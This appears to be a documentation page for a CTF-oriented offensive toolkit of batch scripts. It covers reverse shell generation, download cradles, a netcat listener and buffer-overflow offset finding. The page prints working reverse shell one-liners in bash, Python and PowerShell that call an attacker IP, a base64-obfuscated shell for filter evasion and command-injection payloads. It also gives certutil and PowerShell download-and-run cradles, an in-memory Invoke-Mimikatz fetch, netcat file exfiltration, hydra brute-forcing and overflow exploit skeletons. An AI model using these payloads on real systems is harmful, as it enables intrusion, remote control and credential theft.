# ðŸ’¥ Exploitation Scripts

[â† Back to Main README](../README.md)

---

## Table of Contents

- [Reverse Shell Generator](#reverse-shell-generator)
- [Cradle Generator](#cradle-generator)
- [Listener Alias](#listener-alias)
- [Pattern Calculator](#pattern-calculator)

---

## Reverse Shell Generator

**Script:** `revshell.bat`  
**Purpose:** Generate syntax-correct reverse shell payloads for multiple languages

### Overview

Quickly generate reverse shell one-liners for various programming languages and platforms. No more searching for syntax or typos - get working payloads instantly.

### Prerequisites

**Required:**
- None (pure batch script)

**No Installation Needed!**

### Usage

```batch
revshell.bat
```

Interactive prompts will guide you through:
1. Enter your IP address (LHOST)
2. Enter listening port (LPORT)
3. Select shell type (1-12)

### Examples

**Interactive mode:**
```batch
revshell.bat

Enter your IP (LHOST): 10.10.14.5
Enter listening port (LPORT): 4444

Select shell type:
[1] Bash
[2] Python
...

Enter choice (1-12): 1
```

**Quick reference saved to file:**
```batch
# All payloads saved to: revshell_10.10.14.5_4444.txt
```

### Supported Languages

1. **Bash** - Linux/Unix systems
2. **Python** - Python 2.x
3. **Python3** - Python 3.x with PTY
4. **PowerShell** - Windows systems
5. **Netcat** - Traditional (with -e)
6. **Netcat** - Alternative (without -e)
7. **PHP** - Web applications
8. **Perl** - Legacy Unix systems
9. **Ruby** - Ruby environments
10. **Java** - JVM environments
11. **Windows CMD** - Command Prompt
12. **All** - Show all options

### Generated Payloads

**Bash:**
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

**Python3:**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

**PowerShell:**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Workflow

**Step 1: Start Listener**
```batch
# Terminal 1 - Start listener FIRST
listn.bat 4444
```

**Step 2: Generate Payload**
```batch
# Terminal 2 - Generate shell
revshell.bat

Enter your IP (LHOST): 10.10.14.5
Enter listening port (LPORT): 4444
Select shell type: 1 (Bash)
```

**Step 3: Execute on Target**
```bash
# Copy the generated command
# Execute on target machine
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

**Step 4: Catch Shell**
```
# Terminal 1 - Connection received
Connection from 10.10.10.100:45678
bash-5.0$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### CTF-Specific Examples

**Web Shell (PHP):**
```batch
revshell.bat
# Select [7] PHP
# Copy payload into web shell upload
```

**Command Injection:**
```batch
revshell.bat
# Select [1] Bash
# Inject into vulnerable parameter:
# ?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

**RCE in Python App:**
```batch
revshell.bat
# Select [3] Python3
# Inject into eval() or exec() vulnerability
```

**Windows Target:**
```batch
revshell.bat
# Select [4] PowerShell
# Execute via RCE or scheduled task
```

### Tips & Tricks

**URL encoding for web:**
```batch
# After generating, URL encode special characters
# Space = %20
# & = %26
# ; = %3B
```

**Base64 encoding for obfuscation:**
```batch
# Encode payload to bypass filters
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" | base64
# Result: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo=

# Execute encoded:
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo= | base64 -d | bash
```

**Upgrade shells:**
```bash
# After catching shell, upgrade to full TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Multiple shells:**
```batch
# Terminal 1: listn.bat 4444
# Terminal 2: listn.bat 5555
# Terminal 3: listn.bat 6666

# Generate shells for each port
# Try all if one fails
```

### Common Issues

**Connection refused:**
- Check firewall allows inbound on your port
- Verify IP address is correct (use `ipconfig`)
- Ensure listener is running before execution

**Shell dies immediately:**
- Some shells need process to stay alive
- Try backgrounding: `bash -i >& /dev/tcp/IP/PORT 0>&1 &`

**Special characters escaped:**
- URL encode for web injections
- Use base64 encoding for complex payloads
- Try alternative shell types

---

## Cradle Generator

**Script:** `cradle.bat`  
**Purpose:** Generate file transfer commands and serve files via HTTP

### Overview

The Cradle Generator automates the tedious process of file transfer during exploitation. It detects your IP, starts an HTTP server, and generates ready-to-paste download commands for the target system.

### Prerequisites

**Required:**
- Python 3.x (for HTTP server)
- `curl` (included in Windows 10+)

### Usage

```batch
cradle.bat [filename] [optional:port]
```

### Examples

**Transfer exploit script:**
```batch
cradle.bat exploit.py
```

**Custom port:**
```batch
cradle.bat payload.exe 9000
```

**Transfer enumeration script:**
```batch
cradle.bat linpeas.sh
```

### What It Does

1. **Detects your IP** - Finds local network interface
2. **Starts HTTP server** - Python SimpleHTTPServer on port 8000
3. **Generates commands** - Creates download commands for multiple platforms
4. **Saves to file** - All commands saved for reference
5. **Copies to clipboard** - First command ready to paste

### Generated Commands

**Linux/Unix:**
```bash
# wget
wget http://10.10.14.5:8000/exploit.py

# curl (save)
curl -O http://10.10.14.5:8000/exploit.py

# curl (output to file)
curl http://10.10.14.5:8000/exploit.py -o exploit.py
```

**Python:**
```python
# Python 3
python3 -c "import urllib.request; urllib.request.urlretrieve('http://10.10.14.5:8000/exploit.py', 'exploit.py')"

# Python 2
python -c "import urllib; urllib.urlretrieve('http://10.10.14.5:8000/exploit.py', 'exploit.py')"
```

**PowerShell (Windows):**
```powershell
# Invoke-WebRequest
powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.5:8000/exploit.py' -OutFile 'exploit.py'"

# IWR (shorthand)
powershell -c "iwr -Uri http://10.10.14.5:8000/exploit.py -OutFile exploit.py"

# WebClient
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/exploit.py', 'exploit.py')"
```

**Windows Alternative:**
```batch
# certutil
certutil -urlcache -split -f http://10.10.14.5:8000/exploit.py
```

### Workflow

**Step 1: Prepare exploit**
```batch
# Create your exploit file
echo "import os; os.system('/bin/bash')" > exploit.py
```

**Step 2: Start cradle**
```batch
cradle.bat exploit.py

Detected IP: 10.10.14.5
Port: 8000
File: exploit.py

Starting HTTP server on port 8000...
```

**Step 3: Transfer to target**
```bash
# On target machine (Linux):
wget http://10.10.14.5:8000/exploit.py

# On target machine (Windows):
certutil -urlcache -split -f http://10.10.14.5:8000/exploit.py
```

**Step 4: Execute**
```bash
python3 exploit.py
```

### CTF Examples

**LinPEAS enumeration:**
```batch
# Attacker machine
cradle.bat linpeas.sh

# Target machine
wget http://10.10.14.5:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Windows privilege escalation:**
```batch
# Attacker machine
cradle.bat winPEAS.exe

# Target machine (PowerShell)
iwr http://10.10.14.5:8000/winPEAS.exe -OutFile winPEAS.exe
.\winPEAS.exe
```

**Exploit transfer:**
```batch
# Attacker machine
cradle.bat exploit.py

# Target machine
curl -O http://10.10.14.5:8000/exploit.py
python3 exploit.py
```

### Tips & Tricks

**Multiple files:**
```batch
# Server serves current directory
# All files available at http://IP:PORT/filename

cradle.bat exploit1.py
# Also serves exploit2.py, exploit3.py automatically
```

**Custom wordlists:**
```batch
cradle.bat rockyou.txt

# Target downloads and uses for password cracking
wget http://10.10.14.5:8000/rockyou.txt
hydra -L users.txt -P rockyou.txt ssh://target
```

**Memory execution (PowerShell):**
```powershell
# Execute without touching disk
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-Mimikatz.ps1')
```

---

## Listener Alias

**Script:** `listn.bat`  
**Purpose:** Quick netcat listener without typing `nc -lvnp`

### Overview

Simple wrapper that replaces the verbose `nc -lvnp [port]` command with just `listn [port]`. Saves time and typing during CTFs.

### Prerequisites

**Required:**
- `netcat` (nc) or `ncat`

**Installation:**
```batch
choco install netcat
```

### Usage

```batch
listn.bat [port]
```

### Examples

**Standard listener:**
```batch
listn.bat 4444
```

**Alternative ports:**
```batch
listn.bat 9001
listn.bat 1337
```

### What It Does

Runs: `nc -lvnp [port]`

Where:
- `-l` = Listen mode
- `-v` = Verbose output
- `-n` = No DNS lookup (faster)
- `-p` = Port number

### Workflow

**Catching reverse shells:**
```batch
# Terminal 1: Start listener
listn.bat 4444

# Terminal 2: Generate payload
revshell.bat
# LHOST: 10.10.14.5
# LPORT: 4444
# Type: Bash

# Execute on target
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Terminal 1: Connection received!
Connection from 10.10.10.100:45678
bash-5.0$
```

**File transfer receiver:**
```batch
# Listener receiving file
listn.bat 9001 > received_file.txt

# Sender
cat file.txt | nc 10.10.14.5 9001
```

### Common Ports

```batch
listn.bat 4444   # Standard reverse shell
listn.bat 443    # HTTPS (often allowed through firewalls)
listn.bat 80     # HTTP (often allowed through firewalls)
listn.bat 8080   # Alternative HTTP
listn.bat 9001   # File transfers
listn.bat 1337   # Leet speak
```

---

## Pattern Calculator

**Script:** `pattern.bat`  
**Purpose:** Generate cyclic patterns and calculate offsets for buffer overflow exploitation

### Overview

Wrapper for pwntools' cyclic pattern functionality. Generates unique patterns to find exact buffer overflow offsets without manual calculation.

### Prerequisites

**Required:**
- Python 3.x
- pwntools

**Installation:**
```batch
pip install pwntools
```

### Usage

```batch
pattern.bat
```

Interactive menu:
1. Generate cyclic pattern
2. Find offset from pattern value
3. Find offset from crash address
4. Install pwntools

### Examples

**Generate 500-byte pattern:**
```batch
pattern.bat
> [1] Generate cyclic pattern
> Enter pattern length: 500

Output: aaaabaaacaaadaaaeaaaf...
Pattern saved to: pattern_500.txt
```

**Find offset from crash:**
```batch
pattern.bat
> [2] Find offset from pattern value
> Enter pattern value: 62616164

Output: Offset: 12
```

### How It Works

**The Cyclic Pattern:**
```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa...
```

Every 4-byte sequence is unique:
- Position 0: `aaaa`
- Position 4: `baaa`
- Position 8: `caaa`
- Position 12: `daaa`

When program crashes at `0x62616164` (ASCII: "baad"), you know the overflow occurred at byte 12.

### Workflow

**Step 1: Generate pattern**
```batch
pattern.bat
[1] Generate cyclic pattern
Enter pattern length: 500
```

**Step 2: Crash the program**
```bash
# Feed pattern to vulnerable program
./vulnerable_program < pattern_500.txt

# Program crashes
Segmentation fault (core dumped)
EIP: 0x35624134
```

**Step 3: Find offset**
```batch
pattern.bat
[2] Find offset from pattern value
Enter pattern value: 35624134

Output: Offset: 146
```

**Step 4: Build exploit**
```python
# Now you know: crash at byte 146
payload = b"A" * 146           # Padding to EIP
payload += p32(0xdeadbeef)     # Overwrite EIP
payload += shellcode            # Your shellcode

# Send payload
```

### CTF Examples

**32-bit buffer overflow:**
```batch
# Generate pattern
pattern.bat â†’ [1] â†’ 500

# Crash shows EIP = 0x41366141
pattern.bat â†’ [2] â†’ 41366141
# Output: Offset: 112

# Build exploit
padding = "A" * 112
eip = "\xef\xbe\xad\xde"  # Return address
shellcode = "\x90" * 100 + shellcode_bytes
```

**64-bit buffer overflow:**
```batch
# Generate pattern
pattern.bat â†’ [1] â†’ 1000

# Crash shows RIP = 0x4141366141413565
pattern.bat â†’ [3] â†’ 4141366141413565
# Output: Offset: 520

# Build exploit (8-byte addresses)
padding = "A" * 520
rip = p64(0xdeadbeefdeadbeef)
```

### Tips & Tricks

**Generate larger patterns:**
```batch
# For large buffers
pattern.bat â†’ [1] â†’ 5000
```

**Multiple crashes:**
```batch
# Generate once, test multiple times
# Pattern file saved for reuse
```

**GDB integration:**
```bash
# In GDB after crash
pattern.bat â†’ [2] â†’ [EIP value from GDB]
```

**Different architectures:**
- 32-bit: 4-byte addresses (use EIP)
- 64-bit: 8-byte addresses (use RIP)
- Pattern works for both!

---

[â† Back to Main README](../README.md) | [â† Previous: Reconnaissance](RECONNAISSANCE.md) | [Next: Analysis Scripts â†’](ANALYSIS.md)
